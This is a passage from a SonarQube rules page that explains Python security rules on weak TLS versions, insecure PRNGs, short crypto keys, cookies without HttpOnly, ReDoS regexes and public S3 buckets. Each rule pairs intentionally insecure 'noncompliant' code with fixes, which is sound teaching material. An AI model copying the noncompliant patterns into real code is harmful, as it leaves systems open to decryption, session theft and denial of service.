secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ssl

ssl.SSLContext(ssl.PROTOCOL_SSLv3) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ssl

context &#61; ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.minimum_version &#61; ssl.TLSVersion.TLSv1_3
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2245">
              python:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Only use random number generators which are <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation" rel="nofollow">recommended by
  OWASP</a> or any other trusted organization. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import random

random.getrandbits(1) # Sensitive
random.randint(0,9) # Sensitive
random.random()  # Sensitive

# the following functions are sadly used to generate salt by selecting characters in a string ex: &#34;abcdefghijk&#34;...
random.sample([&#39;a&#39;, &#39;b&#39;], 1)  # Sensitive
random.choice([&#39;a&#39;, &#39;b&#39;])  # Sensitive
random.choices([&#39;a&#39;, &#39;b&#39;])  # Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4426">
              python:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in pyca</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; rsa.generate_private_key(key_size &#61; 1024, backend &#61; backend) # Noncompliant
public_key  &#61; private_key.public_key()
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import dsa
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; dsa.generate_private_key(key_size &#61; 1024, backend &#61; backend) # Noncompliant
public_key  &#61; private_key.public_key()
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; ec.generate_private_key(curve&#61;ec.SECT163R2, backend&#61;backend)  # Noncompliant
public_key  &#61; private_key.public_key()
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; rsa.generate_private_key(key_size &#61; 2048, backend &#61; backend)
public_key  &#61; private_key.public_key()
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import dsa
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; dsa.generate_private_key(key_size &#61; 2048, backend &#61; backend)
public_key  &#61; private_key.public_key()
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

backend &#61; default_backend()

private_key &#61; ec.generate_private_key(curve&#61;ec.SECT409R1, backend&#61;backend)
public_key  &#61; private_key.public_key()
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3330">
              python:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>Flask:</p>
<pre>
from flask import Response

&#64;app.route(&#39;/&#39;)
def index():
    response &#61; Response()
    response.set_cookie(&#39;key&#39;, &#39;value&#39;) # Sensitive
    return response
</pre>
<h2>Compliant Solution</h2>
<p>Flask:</p>
<pre>
from flask import Response

&#64;app.route(&#39;/&#39;)
def index():
    response &#61; Response()
    response.set_cookie(&#39;key&#39;, &#39;value&#39;, httponly&#61;True) # Compliant
    return response
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4784">
              python:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5852&amp;rule_key&#61;python%3AS5852" rel="nofollow">S5852</a>, <a href="/organizations/sopra-steria/rules?open&#61;pythonsecurity%3AS2631&amp;rule_key&#61;pythonsecurity%3AS2631" rel="nofollow">S2631</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a&#43;)&#43;s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2" rel="nofollow">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<p>Django</p>
<pre>
from django.core.validators import RegexValidator
from django.urls import re_path

RegexValidator(&#39;(a*)*b&#39;)  # Sensitive

def define_http_endpoint(view):
    re_path(r&#39;^(a*)*b/$&#39;, view)  # Sensitive
</pre>
<p><code>re</code> module</p>
<pre>
import re
from re import compile, match, search, fullmatch, split, findall, finditer, sub, subn


input &#61; &#39;input string&#39;
replacement &#61; &#39;replacement&#39;

re.compile(&#39;(a*)*b&#39;)  # Sensitive
re.match(&#39;(a*)*b&#39;, input)  # Sensitive
re.search(&#39;(a*)*b&#39;, input)  # Sensitive
re.fullmatch(&#39;(a*)*b&#39;, input)  # Sensitive
re.split(&#39;(a*)*b&#39;, input)  # Sensitive
re.findall(&#39;(a*)*b&#39;, input)  # Sensitive
re.finditer(&#39;(a*)*b&#39;,input)  # Sensitive
re.sub(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
re.subn(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
</pre>
<p><code>regex</code> module</p>
<pre>
import regex
from regex import compile, match, search, fullmatch, split, findall, finditer, sub, subn, subf, subfn, splititer

input &#61; &#39;input string&#39;
replacement &#61; &#39;replacement&#39;

regex.subf(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
regex.subfn(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
regex.splititer(&#39;(a*)*b&#39;, input)  # Sensitive

regex.compile(&#39;(a*)*b&#39;)  # Sensitive
regex.match(&#39;(a*)*b&#39;, input)  # Sensitive
regex.search(&#39;(a*)*b&#39;, input)  # Sensitive
regex.fullmatch(&#39;(a*)*b&#39;, input)  # Sensitive
regex.split(&#39;(a*)*b&#39;, input)  # Sensitive
regex.findall(&#39;(a*)*b&#39;, input)  # Sensitive
regex.finditer(&#39;(a*)*b&#39;,input)  # Sensitive
regex.sub(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
regex.subn(&#39;(a*)*b&#39;, replacement, input)  # Sensitive
</pre>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6281">
              python:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul><li> <code>block_public_acls</code>: to block or not public ACLs to be set to the S3 bucket. </li><li> <code>ignore_public_acls</code>: to consider or not existing public ACLs set to the S3 bucket. </li><li> <code>block_public_policy</code>: to block or not public policies to be set to the S3 bucket. </li><li> <code>restrict_public_buckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li></ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>block_public_acls</code> and <code>ignore_public_acls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>block_public_access</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li><li> Many users have the permission to set ACL or policy to the S3 bucket. </li><li> These settings are not already enforced to true at the account level. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul><li> <code>block_public_acls</code> to <code>True</code> to block new attempts to set public ACLs. </li><li> <code>ignore_public_acls</code> to <code>True</code> to block existing public ACLs. </li><li> <code>block_public_policy</code> to <code>True</code> to block new attempts to set public policies. </li><li> <code>restrict_public_buckets</code> to <code>True</code> to restrict existing public policies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>block_public_access</code> is fully deactivated (nothing is blocked):</p>
<pre>
bucket &#61; s3.Bucket(self,
    &#34;bucket&#34;        # Sensitive
)
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
bucket &#61; s3.Bucket(self,
    &#34;bucket&#34;,
    block_public_access&#61;s3.BlockPublicAccess(
        block_public_acls&#61;False,       # Sensitive
        ignore_public_acls&#61;True,
        block_public_policy&#61;True,
        restrict_public_buckets&#61;True
    )
)
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
bucket &#61; s3.Bucket(self,
    &#34;bucket&#34;,
    block_public_access&#61;s3.BlockPublicAccess.BLOCK_ACLS     # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>This <code>block_public_access</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
bucket &#61; s3.Bucket(self,
    &#34;bucket&#34;,
    block_public_access&#61;s3.BlockPublicAccess.BLOCK_ALL # Compliant
)
</pre>
<p>A similar configuration to the one above can obtained by setting all parameters of the <code>block_public_access</code></p>
<pre>
bucket &#61; s3.Bucket(self, &#34;bucket&#34;,
    block_public_access&#61;s3.BlockPublicAccess(       # Compliant
        block_public_acls&#61;True,
        ignore_public_acls&#61;True,
        block_public_policy&#61;True,
        restrict_public_buckets&#61;True
    )
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" rel="nofollow">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_s3/Bucket.html" rel="nofollow">AWS CDK version 2</a> - Bucket </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2257">
              python:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>Argon2PasswordHasher</code>, <code>BCryptPasswordHasher</code>, …​ should be used instead.</p>
<p>This rule tracks creation of <code>BasePasswordHasher</code> subclasses for Django applications.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a standard algorithm instead of creating a custom one. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
class CustomPasswordHasher(BasePasswordHasher):  # Sensitive
    # ...
</pre>
<h2>See</h2>
